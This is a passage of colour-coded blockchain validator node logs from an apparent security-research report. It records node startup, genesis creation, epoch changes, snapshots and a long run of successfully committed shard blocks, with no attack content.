[0;32mINFO [0m[2026-10-06 22:10:51.029] [process/block]      [0/3/89/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 89 [0;32mnonce[0m = 86 [0;32mhash[0m = 8e3efc51d7340a15b9ec97a76e08d2cd8f796df882eb52d49dd2da651b976d93 
[0;32mINFO [0m[2026-10-06 22:10:57.017] [process/block]      [0/3/90/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 90 [0;32mnonce[0m = 87 [0;32mhash[0m = 777f9e331e8bc89ce35caef9ad66833f1c45c85fc833f9ee806e162d9fcbecc8 
[0;32mINFO [0m[2026-10-06 22:11:03.029] [process/block]      [0/3/91/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 91 [0;32mnonce[0m = 88 [0;32mhash[0m = 55cfa49c37fb227c9d6d2a11a7b5f576b3567a577abf1f87866453c10e0cd4b1 
[0;32mINFO [0m[2026-10-06 22:11:09.015] [process/block]      [0/3/92/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 92 [0;32mnonce[0m = 89 [0;32mhash[0m = d840d06c69b5bed70d30771423630c1a2f6c8bfb6f71cac0ec8334647eca1887 
[0;32mINFO [0m[2026-10-06 22:11:15.014] [process/block]      [0/3/93/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 93 [0;32mnonce[0m = 90 [0;32mhash[0m = 01e3691290f4845b1f61e94502fa26842d9524b8563a2b0c2ed2f7225db347eb 
[0;32mINFO [0m[2026-10-06 22:11:21.015] [process/block]      [0/3/94/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 94 [0;32mnonce[0m = 91 [0;32mhash[0m = 982c58e60487a5cfc307f5073005d5fe9859098e729e554e156519ed0382fad8 
[0;32mINFO [0m[2026-10-06 22:11:27.023] [process/block]      [0/3/95/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 95 [0;32mnonce[0m = 92 [0;32mhash[0m = 4bdf0dc4537cc235241a4eba59a1fb1d2610acaa127e06d86b158056fe17ca2e 
[0;32mINFO [0m[2026-10-06 22:11:33.016] [process/block]      [0/3/96/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 96 [0;32mnonce[0m = 93 [0;32mhash[0m = 3786d833a40cceaf8762d7efc194aaad48dbc2612ae4c15e7a23354b61597a3a 
[0;32mINFO [0m[2026-10-06 22:11:39.016] [process/block]      [0/3/97/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 3 [0;32mshard[0m = 0 [0;32mround[0m = 97 [0;32mnonce[0m = 94 [0;32mhash[0m = 46f68051c07ec10a415e34657bbfee9193168c75e248dd61c0995a43352b4cff 
[0;32mINFO [0m[2026-10-06 22:11:45.014] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:45.015] [processProxy]       [0/4/98/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:11:47.046] [process/block]      [0/4/98/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 98 [0;32mnonce[0m = 95 [0;32mhash[0m = 2e4ac356ca9669c64a52912eda71d8e7de3da77ae2a806a29b20744ff4631c20 
[0;32mINFO [0m[2026-10-06 22:11:47.047] [state]              [0/4/98/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 7abb6257950623b825e9971cfa6cf0373ea5b58fa0d712636b22661505fb7d59 [0;32mepoch[0m = 4 
[0;32mINFO [0m[2026-10-06 22:11:51.023] [process/block]      [0/4/99/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 99 [0;32mnonce[0m = 96 [0;32mhash[0m = 57fbb32eb6f3a9eb5f5623c6b9748eefaebbe036ad07a33c58b22a22a55b144e 
[0;32mINFO [0m[2026-10-06 22:11:57.019] [process/block]      [0/4/100/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 100 [0;32mnonce[0m = 97 [0;32mhash[0m = 8cbcc4cdcb225e5eec1840e30f0006e362e6a30e3eb57bf59ca65bee72c6437a 
[0;32mINFO [0m[2026-10-06 22:12:03.020] [process/block]      [0/4/101/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 101 [0;32mnonce[0m = 98 [0;32mhash[0m = 450e8f4588f2565befa1001767997f32d2f11dd9ce2369e0ff9f22be85003ea5 
[0;32mINFO [0m[2026-10-06 22:12:09.029] [process/block]      [0/4/102/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 102 [0;32mnonce[0m = 99 [0;32mhash[0m = 57b9b6c0a2a6739b3a5c157a947a8cb02691dbd1822ff4e631dcfd39259ef7d1 
[0;32mINFO [0m[2026-10-06 22:12:15.024] [process/block]      [0/4/103/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 103 [0;32mnonce[0m = 100 [0;32mhash[0m = 511179cba9362c163d7feeca9d028c1a4dd6cc45a2515d05989ca0c95671b519 
[0;32mINFO [0m[2026-10-06 22:12:21.025] [process/block]      [0/4/104/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 104 [0;32mnonce[0m = 101 [0;32mhash[0m = 8aa9fea6c45c0ed64ef2c08e8c653c10830f1b1265ca19d8d2766757de7d8e56 
[0;32mINFO [0m[2026-10-06 22:12:27.017] [process/block]      [0/4/105/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 105 [0;32mnonce[0m = 102 [0;32mhash[0m = eaeb13980d6f07abc88a4b4ca4e87df847d29786ed8ee39b1c9720fbf5080b0a 
[0;32mINFO [0m[2026-10-06 22:12:33.022] [process/block]      [0/4/106/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 106 [0;32mnonce[0m = 103 [0;32mhash[0m = 4c5c2cc0f2b18af6ac405c90959097fa478eed25df39874449d4f6ba8cefee70 
[0;32mINFO [0m[2026-10-06 22:12:39.017] [process/block]      [0/4/107/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 107 [0;32mnonce[0m = 104 [0;32mhash[0m = 056af6eaff801fc3a8059f78b8cfd871acc5d4c54dccabb1ae9bfddec4c52a47 
[0;32mINFO [0m[2026-10-06 22:12:45.021] [process/block]      [0/4/108/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 108 [0;32mnonce[0m = 105 [0;32mhash[0m = d6e139f47f3abc2702da50d0529c9e63cbebc9a01758d58d70fc40b3b844153e 
[0;32mINFO [0m[2026-10-06 22:12:51.024] [process/block]      [0/4/109/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 109 [0;32mnonce[0m = 106 [0;32mhash[0m = 823c47fc41a85d6529bbb4178d94a47d28d5955efbc87fc730583bb6d8b80e42 
[0;32mINFO [0m[2026-10-06 22:12:57.020] [process/block]      [0/4/110/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 110 [0;32mnonce[0m = 107 [0;32mhash[0m = 8933812d04ebf44ae0d2a367683c712ec62d998f1ccec32096287b2835009f78 
[0;32mINFO [0m[2026-10-06 22:13:03.022] [process/block]      [0/4/111/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 111 [0;32mnonce[0m = 108 [0;32mhash[0m = 43c2456e4d2d62be12454a14b96b4b13bbe0e74994d3fe6d14260b15d9fb0641 
[0;32mINFO [0m[2026-10-06 22:13:09.021] [process/block]      [0/4/112/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 112 [0;32mnonce[0m = 109 [0;32mhash[0m = f345e83e89725fbe2d64efa0f7be92e459896dd0b5e3c994f03694779deba00e 
[0;32mINFO [0m[2026-10-06 22:13:15.017] [process/block]      [0/4/113/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 113 [0;32mnonce[0m = 110 [0;32mhash[0m = 4f943afc72543df1df88e8bab5789f34907812e92ee4472dec8588cf57f953f1 
[0;32mINFO [0m[2026-10-06 22:13:21.019] [process/block]      [0/4/114/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 114 [0;32mnonce[0m = 111 [0;32mhash[0m = 09c7f0261d7f8888c63634481d907138843629c129700342f8d5c007293a607f 
[0;32mINFO [0m[2026-10-06 22:13:27.023] [process/block]      [0/4/115/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 115 [0;32mnonce[0m = 112 [0;32mhash[0m = daf1c778ffcca84911d0a0b010bef5ace505641e875d30a2fc03df342c6275cd 
[0;32mINFO [0m[2026-10-06 22:13:33.017] [process/block]      [0/4/116/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 116 [0;32mnonce[0m = 113 [0;32mhash[0m = 2552105ebc45c5ed645d436330de9bde9ac1917698bd72650e6b1ab645f43b58 
[0;32mINFO [0m[2026-10-06 22:13:39.021] [process/block]      [0/4/117/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 117 [0;32mnonce[0m = 114 [0;32mhash[0m = 2af755a6438542af6047e6e12ed3b202ec3cf6842ccad316fe66025bd8a4a40e 
[0;32mINFO [0m[2026-10-06 22:13:45.018] [process/block]      [0/4/118/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 118 [0;32mnonce[0m = 115 [0;32mhash[0m = 4c9163ea7c209b0ec402ce8882c60167e2cfb1342ee67773c62f997a711389a8 
[0;32mINFO [0m[2026-10-06 22:13:51.021] [process/block]      [0/4/119/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 119 [0;32mnonce[0m = 116 [0;32mhash[0m = 9c710ec3423c79d14e555f015ef7a46a8eaacaecdc87f18c4b01db0ea581be3e 
[0;32mINFO [0m[2026-10-06 22:13:57.021] [process/block]      [0/4/120/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 4 [0;32mshard[0m = 0 [0;32mround[0m = 120 [0;32mnonce[0m = 117 [0;32mhash[0m = 135025b050731fbf52a29c6713fa9857c34130f09e62875416028d495e16691b 
[0;32mINFO [0m[2026-10-06 22:14:03.003] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:03.003] [processProxy]       [0/5/121/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:14:05.170] [process/block]      [0/5/121/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 121 [0;32mnonce[0m = 118 [0;32mhash[0m = ece8dc1f956fb9db80e03d8c821472451f09036203daa9d325fe10db91a9b1a1 
[0;32mINFO [0m[2026-10-06 22:14:05.178] [state]              [0/5/121/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = f50cefa3cc02078d8a54b3274d0a93b3ec3b3ab6a7dcf5ae6c7b2637b315514f [0;32mepoch[0m = 5 
[0;32mINFO [0m[2026-10-06 22:14:09.018] [process/block]      [0/5/122/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 122 [0;32mnonce[0m = 119 [0;32mhash[0m = ad1152637f6c272af3a4ac7f8ba8ebfd9b23e9515c33093ab020f40e46800d16 
[0;32mINFO [0m[2026-10-06 22:14:15.022] [process/block]      [0/5/123/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 123 [0;32mnonce[0m = 120 [0;32mhash[0m = 7acf78ea4b645517c4b7951b2a7e1f37492ee9926ed4d626cda21274a70ae186 
[0;32mINFO [0m[2026-10-06 22:14:21.020] [process/block]      [0/5/124/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 124 [0;32mnonce[0m = 121 [0;32mhash[0m = bc9aa6f3c352f6d061e137ee0dd3f4d910417c3c76322114a3ebeb08d613fa5a 
[0;32mINFO [0m[2026-10-06 22:14:27.017] [process/block]      [0/5/125/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 125 [0;32mnonce[0m = 122 [0;32mhash[0m = 8e73a4e45df464fa7056e956d9270973ed1518a96d9f40ad5e134483902bd834 
[0;32mINFO [0m[2026-10-06 22:14:33.021] [process/block]      [0/5/126/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 5 [0;32mshard[0m = 0 [0;32mround[0m = 126 [0;32mnonce[0m = 123 [0;32mhash[0m = e5290014b14df591eb3c2709822eee2b0347a463003ad3efd057d019393de1ca 
[0;32mINFO [0m[2026-10-06 22:14:34.068] [node]               [0/5/126/(END_ROUND)] terminating at user's signal...          
```

### C 5.5, validator5 full log, shard process started 22:01:39, 123 blocks committed, terminated 22:14:33

File `security-research/node-logs/validator5.log`.

```text
[0;32mINFO [0m[2026-10-06 22:01:39.372] [node]               [/0/0/]        starting node                            [0;32mversion[0m = v1.0.0/go1.26.4/darwin-arm64/3bd876d357 [0;32mpid[0m = 43296 
[0;32mINFO [0m[2026-10-06 22:01:39.375] [factory]            [/0/0/]        start time                               [0;32mformatted[0m = Tue Oct 6 22:01:57 WAT 2026 [0;32munix timestamp[0m = 1791320517 [0;32msupernova unix timestamp[0m = 1791323157 [0;32mround duration[0m = 6s [0;32msupernova round duration[0m = 6s 
[0;32mINFO [0m[2026-10-06 22:01:39.376] [factory]            [/0/0/]        the node loaded the validatorKey.pem file and is running in single-key mode 
[0;32mINFO [0m[2026-10-06 22:01:39.421] [factory]            [/0/0/]        p2p private key: generated a new private key for p2p signing 
[0;32mINFO [0m[2026-10-06 22:01:39.426] [main/p2p]           [/0/0/]        listening on addresses                   [0;32maddr0[0m = /ip4/127.0.0.1/tcp/21505/p2p/16Uiu2HAkxjikiYEQDoshSqxzhoikxLbMgzP75W1beT5p4zWfG2fP [0;32maddr1[0m = /ip4/172.20.10.5/tcp/21505/p2p/16Uiu2HAkxjikiYEQDoshSqxzhoikxLbMgzP75W1beT5p4zWfG2fP 
[0;32mINFO [0m[2026-10-06 22:01:39.426] [main/p2p]           [/0/0/]        started the network discovery process... 
[0;32mINFO [0m[2026-10-06 22:01:59.427] [factory]            [/0/0/]        shard info                               [0;32mstarted in shard[0m = 0 
[0;32mINFO [0m[2026-10-06 22:01:59.434] [factory]            [/0/0/]        bootstrap parameters                     [0;32mshardId[0m = 0 [0;32mepoch[0m = 0 [0;32mnumShards[0m = 1 
[0;32mINFO [0m[2026-10-06 22:01:59.441] [node]               [/0/0/]        Bootstrap                                [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.640] [..nodesCoordinator] [0/0/0/]       new nodes config is set for epoch        [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:06.663] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:06.667] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.046] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.056] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 0 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 
[0;32mINFO [0m[2026-10-06 22:02:10.059] [genesis/process]    [0/0/0/]       genesisBlockCreator.createHeaders        [0;32mshard[0m = 4294967295 [0;32mnonce[0m = 0 [0;32mround[0m = 0 [0;32mroot hash[0m = 5b8c8589b3a99e69f13a0e556ed873b94e6236d4756c19ebd16de6e62792ff8d 
[0;32mINFO [0m[2026-10-06 22:02:10.381] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.488] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.491] [factory]            [0/0/0/]       AOT transaction selection enabled        [0;32mcacheSize[0m = 10 [0;32mselectionTimeoutMs[0m = 30000 
[0;32mINFO [0m[2026-10-06 22:02:10.519] [factory]            [0/0/0/]       indexGenesisBlocks(): historyRepo.RecordBlock [0;32mshardID[0m = 0 [0;32mhash[0m = 44c8ad7cae76622aec11467c2c08d55e08eb2168dc1f67baf8108e349e41732d 
[0;32mINFO [0m[2026-10-06 22:02:10.762] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.842] [processProxy]       [0/0/0/]       processorProxy                           [0;32mconfigured[0m = 0 
[0;33mWARN [0m[2026-10-06 22:02:10.845] [state]              [0/0/0/]       could not retrieve snapshot info         [0;33merror[0m = key not found 
[0;32mINFO [0m[2026-10-06 22:02:10.845] [factory]            [0/0/0/]       starting consensus                       [0;32mepoch[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:10.855] [vmContainerFactory] [0/0/0/]       VM 1.5 created                           
[0;32mINFO [0m[2026-10-06 22:02:10.861] [node]               [0/0/2/(BLOCK)] application is now running               
[0;32mINFO [0m[2026-10-06 22:02:10.965] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.033] [processProxy]       [0/0/2/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 0 
[0;32mINFO [0m[2026-10-06 22:02:11.044] [process/block]      [0/0/2/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 2 [0;32mnonce[0m = 1 [0;32mhash[0m = d5bdd96278b9dbd0f5207b2b83bc0f27043f074c125dc9070489f05efd7348aa 
[0;32mINFO [0m[2026-10-06 22:02:15.012] [process/block]      [0/0/3/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 3 [0;32mnonce[0m = 2 [0;32mhash[0m = 36586d5593d9fbb8f43f889cc78200efed240d8f77671bdb1deea97a72d82e04 
[0;32mINFO [0m[2026-10-06 22:02:21.018] [process/block]      [0/0/4/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 4 [0;32mnonce[0m = 3 [0;32mhash[0m = f7ab2e1fc0e18335e948b13fb3468942c4b09c2d6092eff80e8bd8b179528d67 
[0;32mINFO [0m[2026-10-06 22:02:27.015] [process/block]      [0/0/5/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 5 [0;32mnonce[0m = 4 [0;32mhash[0m = d3545a9a67a0580e3e8f9479a2a8f191a7bdaacddab847f05bedd76065626d3a 
[0;32mINFO [0m[2026-10-06 22:02:33.016] [process/block]      [0/0/6/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 6 [0;32mnonce[0m = 5 [0;32mhash[0m = 9d470069c6137fe2d43a3d458807089baeee6639c070592bff6255b1b46c7070 
[0;32mINFO [0m[2026-10-06 22:02:39.019] [process/block]      [0/0/7/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 7 [0;32mnonce[0m = 6 [0;32mhash[0m = 8022e0edb3f7b3a39cb074302123db3a9817edaa8d99bc51fb9f7e637143e54c 
[0;32mINFO [0m[2026-10-06 22:02:45.018] [process/block]      [0/0/8/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 8 [0;32mnonce[0m = 7 [0;32mhash[0m = 8458e3fdc458619cb5ab4abf4388ee5fbe81d6ec0479c9a4f69b2e5748bd16c1 
[0;32mINFO [0m[2026-10-06 22:02:51.018] [process/block]      [0/0/9/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 9 [0;32mnonce[0m = 8 [0;32mhash[0m = fcc9c238e3c0b8583d0ac32f3fc6d993d69408b046c35359d37fa2a7ba9920aa 
[0;32mINFO [0m[2026-10-06 22:02:57.021] [process/block]      [0/0/10/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 10 [0;32mnonce[0m = 9 [0;32mhash[0m = 3251be20e3a1430b0cb2aaf39abb7d6f68d4743b9bb63ae63b36464a7436fd57 
[0;32mINFO [0m[2026-10-06 22:03:03.011] [process/block]      [0/0/11/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 11 [0;32mnonce[0m = 10 [0;32mhash[0m = d7751e8c75702442ebebd173e134f3bbe2843dc6d63110283d529b518f58d818 
[0;32mINFO [0m[2026-10-06 22:03:09.014] [process/block]      [0/0/12/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 12 [0;32mnonce[0m = 11 [0;32mhash[0m = a5afdd224e6e20c412a9110259ad74fcf5a3cfb4af7bd55c831f847aa9971f6e 
[0;32mINFO [0m[2026-10-06 22:03:15.015] [process/block]      [0/0/13/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 13 [0;32mnonce[0m = 12 [0;32mhash[0m = 3f9e2b17674e22f6c44f9391142afe082368930b3f979a1b0a6ab1ff6db3a2dc 
[0;32mINFO [0m[2026-10-06 22:03:21.022] [process/block]      [0/0/14/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 14 [0;32mnonce[0m = 13 [0;32mhash[0m = 58ec9c87aabf474fee7c30fb5d1b83598bbaddfc16aedc73e089f415b5be7d7a 
[0;32mINFO [0m[2026-10-06 22:03:27.020] [process/block]      [0/0/15/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 15 [0;32mnonce[0m = 14 [0;32mhash[0m = da363faaef0e970e4a6f0dff6ae4902d014556b192495b8ad4c7e66dcd56fea3 
[0;32mINFO [0m[2026-10-06 22:03:33.014] [process/block]      [0/0/16/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 16 [0;32mnonce[0m = 15 [0;32mhash[0m = cc0a413ba2c205daf2a926df638df38d865b29aa5bb5e544e62658874ece68e7 
[0;32mINFO [0m[2026-10-06 22:03:39.019] [process/block]      [0/0/17/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 17 [0;32mnonce[0m = 16 [0;32mhash[0m = 7a1fca6d7e7d454798cbc4da4b88665dac5b4afeb426b5d67299f63157e79567 
[0;32mINFO [0m[2026-10-06 22:03:45.019] [process/block]      [0/0/18/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 18 [0;32mnonce[0m = 17 [0;32mhash[0m = a24bcbbb118cca329fe797216f78d8ed81cb5f67460e5a8e08104ad47d1ed483 
[0;32mINFO [0m[2026-10-06 22:03:51.019] [process/block]      [0/0/19/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 19 [0;32mnonce[0m = 18 [0;32mhash[0m = 1d440629ecaab36c1d1995c866f4525fab933d4933c0abb50eee4664c42251ce 
[0;32mINFO [0m[2026-10-06 22:03:57.015] [process/block]      [0/0/20/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 20 [0;32mnonce[0m = 19 [0;32mhash[0m = d5edaee92782c5150a9e8a5bcf9d59077440de006d3446df18f039f115e05fc1 
[0;32mINFO [0m[2026-10-06 22:04:03.021] [process/block]      [0/0/21/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 21 [0;32mnonce[0m = 20 [0;32mhash[0m = e88f671ee60e08ecf0471ca0b7411370ecd0b70cc58ad88b9862be9cd3dcb3a1 
[0;32mINFO [0m[2026-10-06 22:04:09.016] [process/block]      [0/0/22/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 22 [0;32mnonce[0m = 21 [0;32mhash[0m = 5f6dd2ec590bcaa8bb39195e9bd4794405995ad00d0092516217692c88243d6c 
[0;32mINFO [0m[2026-10-06 22:04:15.017] [process/block]      [0/0/23/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 23 [0;32mnonce[0m = 22 [0;32mhash[0m = 18578d86977b586cbce97167926e717ded597fb2230d2bceb4f2dfabf63a8b60 
[0;32mINFO [0m[2026-10-06 22:04:21.015] [process/block]      [0/0/24/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 24 [0;32mnonce[0m = 23 [0;32mhash[0m = 18bd49d3bbda56fe4e5564ae770d51511fda48a83dd39feb84d7ce77fd7ff9ab 
[0;32mINFO [0m[2026-10-06 22:04:27.016] [process/block]      [0/0/25/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 25 [0;32mnonce[0m = 24 [0;32mhash[0m = 34a7ea4de92180120f258f31622f7ea73777251a1aaa88b6ca06193d214e50cb 
[0;32mINFO [0m[2026-10-06 22:04:33.018] [process/block]      [0/0/26/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 0 [0;32mshard[0m = 0 [0;32mround[0m = 26 [0;32mnonce[0m = 25 [0;32mhash[0m = 579e849de660393f9617fd08724e0bc658fa49c9607bc009ab625706d5279eca 
[0;32mINFO [0m[2026-10-06 22:04:39.017] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:39.018] [processProxy]       [0/1/27/(BLOCK)] processorProxy                           [0;32mconfigured[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:49.921] [process/block]      [0/1/28/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 28 [0;32mnonce[0m = 26 [0;32mhash[0m = f9c7d6f5851cd6f918d56c686bb639c5371f3c457f4a972b637c72d0b814e166 
[0;32mINFO [0m[2026-10-06 22:04:49.922] [state]              [0/1/28/(END_ROUND)] starting snapshot                        [0;32mtype[0m = user trie [0;32mrootHash[0m = 79c9a65d56dd423b42fde0405f173fbaf42d081e4de05780814e509da6664770 [0;32mepoch[0m = 1 
[0;32mINFO [0m[2026-10-06 22:04:51.025] [process/block]      [0/1/29/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 29 [0;32mnonce[0m = 27 [0;32mhash[0m = d72db60a3ba3f76f2e43bd6f2671a89840e19b8eb399aacdc337926acbbdb0de 
[0;32mINFO [0m[2026-10-06 22:04:57.021] [process/block]      [0/1/30/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 30 [0;32mnonce[0m = 28 [0;32mhash[0m = d41b91c520c1a19432fda0bdd0ff5a20b52d27bb744a67f219059a88d257ad6f 
[0;32mINFO [0m[2026-10-06 22:05:03.020] [process/block]      [0/1/31/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 31 [0;32mnonce[0m = 29 [0;32mhash[0m = e097f2f6af1a03acf564fd1db08a79de52cf21a1b3304c3e605d7cf199f7d8e3 
[0;32mINFO [0m[2026-10-06 22:05:09.022] [process/block]      [0/1/32/(END_ROUND)] shard block has been committed successfully [0;32mepoch[0m = 1 [0;32mshard[0m = 0 [0;32mround[0m = 32 [0;32mnonce[0m = 30 [0;32mhash[0m = b30735c1b534124f21adaa8cb55ff08e9ae5dcc0ab664c0b59326eb30fe2ae29 
